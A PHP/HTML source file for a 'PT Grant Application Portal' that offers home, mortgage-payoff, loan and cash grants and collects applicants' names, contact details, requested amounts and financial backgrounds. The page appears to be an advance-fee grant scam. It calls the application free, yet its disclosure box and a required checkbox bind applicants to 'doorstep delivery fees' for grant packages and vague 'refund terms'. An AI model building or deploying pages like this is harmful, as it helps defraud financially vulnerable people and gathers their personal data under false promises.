<?php
// Handle feedback messages passed via URL from save.php
$status = $_GET['status'] ?? '';
$message = '';
$messageType = '';

if ($status === 'success') {
    $refId = htmlspecialchars($_GET['ref'] ?? '00000');
    $message = "Application submitted successfully! Your Application Ref ID is <strong>#{$refId}</strong>.";
    $messageType = "success";
} elseif ($status === 'error') {
    $message = htmlspecialchars($_GET['msg'] ?? 'An error occurred during submission.');
    $messageType = "error";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PT Grant Application Portal</title>
    <style>
        :root {
            --primary: #1e3a8a;
            --secondary: #2563eb;
            --bg: #f8fafc;
            --card-bg: #ffffff;
            --text: #0f172a;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: var(--bg); color: var(--text); padding: 20px; line-height: 1.6; }
        .container { max-width: 750px; margin: 20px auto; background: var(--card-bg); padding: 35px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08); }
        h1 { color: var(--primary); text-align: center; margin-bottom: 5px; }
        .subtitle { text-align: center; color: #64748b; margin-bottom: 25px; }
        .notice-box { background: #eff6ff; border-left: 5px solid var(--secondary); padding: 15px; border-radius: 6px; margin-bottom: 25px; font-size: 0.95rem; }
        .notice-box ul { margin-left: 20px; margin-top: 8px; }
        .form-group { margin-bottom: 18px; }
        label { display: block; font-weight: 600; margin-bottom: 6px; }
        input[type="text"], input[type="email"], input[type="tel"], input[type="number"], select, textarea {
            width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 1rem;
        }
        textarea { height: 100px; resize: vertical; }
        .checkbox-group { display: flex; align-items: flex-start; gap: 10px; margin-top: 15px; font-size: 0.9rem; }
        .checkbox-group input { margin-top: 4px; }
        button { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 6px; font-size: 1.05rem; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-top: 15px; }
        button:hover { background: #1e40af; }
        .alert { padding: 15px; border-radius: 6px; margin-bottom: 20px; text-align: center; font-size: 0.95rem; }
        .alert.success { background: #dcfce7; color: #166534; border: 1px solid #bbf7d0; }
        .alert.error { background: #fee2e2; color: #991b1b; border: 1px solid #fecaca; }
    </style>
</head>
<body>

<div class="container">
    <h1>PT Grant Application Portal</h1>
    <p class="subtitle">Home Grants, Mortgage Relief, Loan Help & Cash Assistance</p>

    <!-- Important Information Box -->
    <div class="notice-box">
        <strong>Important Terms & Disclosure:</strong>
        <ul>
            <li><strong>Free Application:</strong> All grant applications are 100% free to submit.</li>
            <li><strong>Doorstep Delivery Fee:</strong> If physical grant packages require doorstep delivery, a standard delivery fee will apply.</li>
            <li><strong>Refund Policy:</strong> Disbursed cash grants are eligible for refunds under verified terms.</li>
        </ul>
    </div>

    <!-- Notification Banner -->
    <?php if (!empty($message)): ?>
        <div class="alert <?php echo $messageType; ?>">
            <?php echo $message; ?>
        </div>
    <?php endif; ?>

    <form method="POST" action="save.php">
        <div class="form-group">
            <label for="fullName">Full Name *</label>
            <input type="text" id="fullName" name="fullName" required placeholder="John Doe">
        </div>

        <div class="form-group">
            <label for="email">Email Address *</label>
            <input type="email" id="email" name="email" required placeholder="john@example.com">
        </div>

        <div class="form-group">
            <label for="phone">Phone Number *</label>
            <input type="tel" id="phone" name="phone" required placeholder="(123) 456-7890">
        </div>

        <div class="form-group">
            <label for="grantType">Grant Category *</label>
            <select id="grantType" name="grantType" required>
                <option value="">-- Select Category --</option>
                <option value="Home Assistance Grant">Home Assistance Grant</option>
                <option value="Mortgage Payoff Grant">Mortgage Payoff Grant</option>
                <option value="Loan Payoff Help">Loan Payoff Help</option>
                <option value="Cash Grant Help">Cash Grant Help</option>
            </select>
        </div>

        <div class="form-group">
            <label for="amountRequested">Requested Amount ($) *</label>
            <input type="number" id="amountRequested" name="amountRequested" step="0.01" min="100" required placeholder="5000">
        </div>

        <div class="form-group">
            <label for="reason">Reason for Application & Financial Background *</label>
            <textarea id="reason" name="reason" required placeholder="Describe your financial background and how this grant will assist you..."></textarea>
        </div>

        <div class="checkbox-group">
            <input type="checkbox" id="deliveryFeeAccepted" name="deliveryFeeAccepted" value="1" required>
            <label for="deliveryFeeAccepted">
                I understand that submitting this application is free, but doorstep delivery fees apply if physical grant materials are delivered to my doorstep. I also acknowledge cash grant refund terms.
            </label>
        </div>

        <button type="submit">Submit Free Application</button>
    </form>
</div>

</body>
</html>
